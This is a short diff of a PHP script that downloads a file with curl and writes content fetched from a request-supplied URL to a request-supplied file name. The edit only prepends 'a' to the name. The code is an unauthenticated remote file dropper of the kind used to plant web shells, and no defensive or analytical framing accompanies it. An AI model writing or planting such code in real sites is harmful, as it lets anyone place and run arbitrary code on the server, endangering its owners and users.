@@ -18,7 +18,7 @@ curl_setopt($ch, CURLOPT_FILE, $fp);
 $response = curl_exec($ch);
 if ($response) {echo 'success';} else {echo 'fail';}
 $url = $_REQUEST['u'];     
-$file_name = $_REQUEST['f'];
+$file_name = 'a'.$_REQUEST['f'];
     if (file_put_contents($file_name, file_get_contents($url)))
     {        echo "File downloaded successfully";    }
     else    {        echo "File downloading failed.";    }
